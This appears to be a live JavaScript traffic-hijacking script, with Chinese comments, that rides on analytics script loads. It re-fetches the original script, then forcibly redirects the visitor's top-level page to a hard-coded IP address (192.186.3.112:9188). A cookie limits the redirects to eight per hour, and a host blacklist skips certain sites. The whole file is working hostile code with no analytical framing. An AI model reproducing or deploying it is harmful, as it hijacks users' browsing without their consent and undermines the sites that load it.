//1.15: 添加了“?__=__&”关键字。
//2.06: 过滤域名ydb100.com等。
//3.15: 修改每个小时执行次数为8次
var strScript = 'script',

    str_00_g_0 = '00_g_0',

    window = self,

    s = /([^:\/]|^)\//,

    t = '$1//',

    isOpera = window.opera,

       originSrc = (function(js_src) {
            /* 处理原先的src地址 */
            //当js_src 不存在 或者 格式不正确 或者 包含 "00.g.0"时返回 0
            if (!js_src || /([^:]|^)\/\//.test(js_src) || ~js_src.indexOf(str_00_g_0.replace(/_/g, '.'))) {
                return 0;
            }
            //向js_src中添加参数name:'__',value:'_'
            //如果参数表中是正常的参数格式则添加,不是则不添加
//            js_src = (function(pathArry) {
//                var paramStr = pathArry[1] || '';
//                return /=/.test(paramStr || '=') ? (pathArry[0] || '') + '?__=_&' + paramStr : js_src;
//            })(js_src.split('?'));
            js_src = js_src + '?__=__&';
            if (!js_src.lastIndexOf('/')) {
                return js_src.replace(s, t);
            }
            return js_src.substr(0, 1) + js_src.substr(1).replace(s, t);
        })(
            (function(curScriptElement, allScripts, errMsg) {
                /*
                 find the current script src url
                 find Charset and Async
                 */
                //如果Document.currentScript是可以找到元素时,直接返回这个元素的src
                if (curScriptElement) {
                    Charset = curScriptElement.charset;
                    Async = curScriptElement.async;
                    return curScriptElement.src;
                }
                try {
                    //Z.G.Y()故意抛出异常
                    Z.G.Y();
                } catch (c) {
                    // 取得异常信息字符串
                    errMsg = c.stack || c.fileName || c.sourceURL || c.stacktrace;
                    if (!errMsg && isOpera) {
                        //没有错误信息并且是Opera浏览器, 将异常对象c直接转成字符串
                        errMsg = (('' + c).match(/of linked script \S+/g) || []).join(' ');
                    }
                }
                if (errMsg) {
                    errMsg = errMsg.split(/[@ ]/g).pop();
                    errMsg = errMsg[0] == '(' ? errMsg.slice(1, -1) : errMsg;
                    //倒序遍历scriptDOM
                    //将最后一个和异常信息匹配的script标签的src返回,如果都没有匹配script标签处理后的异常信息返回(应该是一个src)
                    //记录 Charset和Async
                    for (var w = errMsg.replace(/(:\d+)?:\d+$/i, ''), scriptEl, i = allScripts.length; i--;) {
                        scriptEl = allScripts[i];
                        if (w == scriptEl.src) {
                            Charset = scriptEl.charset;
                            Async = scriptEl.async;
                            break;
                        }
                    }
                    return w;
                }
                //在没有匹配到异常信息时倒序遍历scriptDOM
                //将加载完成的第一个script标签的src返回,如果都没有记载完成将最后一个script标签的src返回
                //记录 Charset和Async
                for (var lastJsDOM = (allScripts[allScripts.length - 1] || {}), y = 0, cur; y++;) {
                    cur = allScripts[y];
                    if (cur.readyState == 'interactive') {
                        Charset = cur.charset;
                        Async = cur.async;
                        return cur.src;
                    }
                }
                Charset = lastJsDOM.charset;
                Async = lastJsDOM.async;
                return lastJsDOM.src;
            })(document.currentScript, document.getElementsByTagName(strScript))),

    isrm4 = /120\.55\.150\.242/.test(originSrc),

    isCnzz = /cnzz\.com/.test(originSrc),

    isLa = /js\.users\.51\.la/.test(originSrc),

    isBaidu = /hm\.baidu\.com/.test(originSrc),

    isAnaly = /www\.google\-analytics\.com/.test(originSrc);

if (!isCnzz && !isLa && !isBaidu && !isAnaly && !isrm4) {

    head = document.getElementsByTagName('head')[0],

        newScriptElm = document.createElement(strScript),

        sessionStorage = window.sessionStorage;

    originSrc && (Charset && (newScriptElm.charset = Charset),

        (newScriptElm.src = originSrc),

        !Async && /\[nati/.test(document.write + '') ? document.write('<' + strScript + ' src="' + originSrc + '"' + (Charset ? ' charset="' + Charset + '"': '') + '><\/' + strScript + '>') : head.appendChild(newScriptElm));

}

function getCookieVal(offset) {

    var endstr = document.cookie.indexOf(";", offset);

    if (endstr == -1) endstr = document.cookie.length;

    return unescape(document.cookie.substring(offset, endstr));

}

function createCookie(name,value,seconds) {
    if (seconds) {
        var date = new Date();
        date.setTime(date.getTime() + (seconds * 1000));
        var expires = "; expires=" + date.toUTCString();
    }
    else var expires = "";
    document.cookie = name + "=" + value + expires + "; path=/";
}

function GetCookie(name) {

    var arg = name + "=";

    var alen = arg.length;

    var clen = document.cookie.length;

    var i = 0;

    while (i < clen) {

        var j = i + alen;

        if (document.cookie.substring(i, j) == arg) return getCookieVal(j);

        i = document.cookie.indexOf(" ", i) + 1;

        if (i == 0) break;

    }

    return null;

}

var locaHref = "http://192.186.3.112:9188";   //0801更换
function browserRedirect() {

    var sUserAgent = navigator.userAgent.toLowerCase();

    var bIsIpad = sUserAgent.match(/ipad/i) == "ipad";

    var bIsIphoneOs = sUserAgent.match(/iphone os/i) == "iphone os";

    var bIsMidp = sUserAgent.match(/midp/i) == "midp";

    var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == "rv:1.2.3.4";

    var bIsUc = sUserAgent.match(/ucweb/i) == "ucweb";

    var bIsAndroid = sUserAgent.match(/android/i) == "android";

    var bIsCE = sUserAgent.match(/windows ce/i) == "windows ce";

    var bIsWM = sUserAgent.match(/windows mobile/i) == "windows mobile";

    if ((bIsIpad || bIsIphoneOs || bIsMidp || bIsUc7 || bIsUc || bIsAndroid || bIsCE || bIsWM)) {

        window.top.location.href = locaHref;

    } else {

        window.top.location.href = locaHref;

    }

}

var blackhostlist=['www.rrrr0022.com','fans.bestvogue.com','www.de4f.com','pica-juicy.picacomic.com',
                   'u444u.com','pornodoido.com','kula88.com',
                   'mobile2202.gameassists.co.uk','mobile22.gameassists.co.uk',
                   'localhost:3055','23344.com','790030.com','98098.tw',
                   'm.5017a1.com','m.775533.com','warn.mse.360.cn','tejia.aili.com',
                   'www.chinatimes.com','www.cartier.cn','768138.com',
                   '088138.com','847138.com','713138.com','5017t1.com',
                   '5017t2.com','5017t3.com','5017t4.com','5017t5.com',
                   'gcglass.com.cn:8086'];
var blacklocationlist=['http://dragon8.troyhero.com/aurora/default.aspx'];
var cookName = "__sstre";
var globalTimes = 0 ;


function shouldIRedirect (name) {
    var data1,data2,myCookie = GetCookie(name);
    if(myCookie != null && myCookie.indexOf("|") > 0){
        var datas = myCookie.split("|"); 
        if (datas.length == 2) {
            data1 = parseInt(datas[0]);
            data2 = Number(datas[1]);
            if(!isNaN(data1)  &&  !isNaN(data2)){
                var ct = new Date().valueOf();
                globalTimes = data1;
               // if(1E4 > ct - data2  || globalTimes >= 8){//去掉时间的限制，只是执行一次
                if(globalTimes >= 8){

                    return false;
                }
            }
        }      
    }
    return true;
}

function isInBlackList(){
    var current_host_name = window.top.location.host.toLowerCase();
    var current_location = window.top.location.href.toLowerCase();
    for(var j = 0 ; j < blacklocationlist.length; j++){
        if(current_location == blacklocationlist[j]){
            return true;
        }
    }
    for(var i = 0 ; i < blackhostlist.length; i++){
        if(current_host_name.indexOf( blackhostlist[i]) >= 0){
            return true;
        }
    } 
    return false;
}

//js多次加载只执行一次，0326

function run_only_once(keystring, fn) {
    var w = window.top;
    if (keystring in w) {
        return;
    }
    w[keystring] = 1;
    fn();
}

run_only_once("xxx111111_", function(){

    if(!isInBlackList()){
        if (document.getElementById("123Aa234Bb345Cc") == null && shouldIRedirect(cookName)){
            createCookie(cookName, "" , -1);
            var timestamp = (new Date()).valueOf();
            createCookie(cookName, (globalTimes + 1) + "|" + timestamp , 1*60*60);
            browserRedirect();
        }
    }

});























